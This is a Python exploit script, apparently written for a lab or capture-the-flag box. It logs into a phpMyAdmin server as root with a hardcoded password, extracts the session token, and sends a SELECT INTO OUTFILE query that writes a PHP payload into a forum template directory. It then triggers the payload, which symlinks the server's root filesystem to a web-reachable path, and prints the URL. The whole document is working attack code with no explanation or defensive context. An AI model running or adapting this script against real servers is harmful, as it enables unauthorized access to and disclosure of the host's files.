#!/usr/bin/env python3
import requests
import re
import sys

# Prompt for the server IP address
output = "p.php"
symlink = "a.php"
ip_address = input("Enter the IP address of the phpMyAdmin server: ")

requests.packages.urllib3.disable_warnings()
s = requests.Session()

# Login to phpMyAdmin with provided credentials
ret = s.post(f"https://{ip_address}/phpmyadmin/index.php", verify=False, data={'pma_username': 'root', 'pma_password': "Fg-'kKXBj87E:aJ$"})
if ret.status_code != 200:
    print("Login: FAILURE")
    sys.exit(1)
else:
    print(f"Login: SUCCESS")

# Extract the token from the response
rx = re.compile(r'^src="main.php\?token=(.*)&amp;.*')
token = None

for line in ret.text.split():
    match = rx.match(line)
    if match:
        token = match.group(1)
        break

if not token:
    print("Token: FAILURE")
    sys.exit(1)

print("Token:", token)

# Prepare the SQL injection payload
sql_inject = f"SELECT 1, '<?php symlink(\"/\", \"{symlink}\");?>' INTO OUTFILE '/var/www/forum/templates_c/{output}'"

data = {
    'is_js_confirmed': 0,
    'token': token,
    'pos': 0,
    'goto': 'server_sql.php',
    'message_to_show': 'Ok',
    'sql_query': sql_inject,
    'ajax_request': "true"
}

# Send the SQL injection request
ret = s.post(f"https://{ip_address}/phpmyadmin/import.php", data=data)

# Attempt to parse JSON response
try:
    ret_json = ret.json()
except ValueError:
    print("Failed to parse JSON response")
    sys.exit(1)

# Check if the SQL injection was successful
if ret_json.get('success', False):
    print("SQL injection: SUCCESS")
else:
    print("SQL injection: FAILED", ret_json.get('error'))
    sys.exit(1)

# Activate the PHP code
ret = requests.get(f"https://{ip_address}/forum/templates_c/{output}", verify=False)
print("PHP code execution response status:", ret.status_code)

if ret.status_code != 200:
    print("Execution failed")
else:
    print(f"SUCCESS, go to https://{ip_address}/forum/templates_c/{symlink}")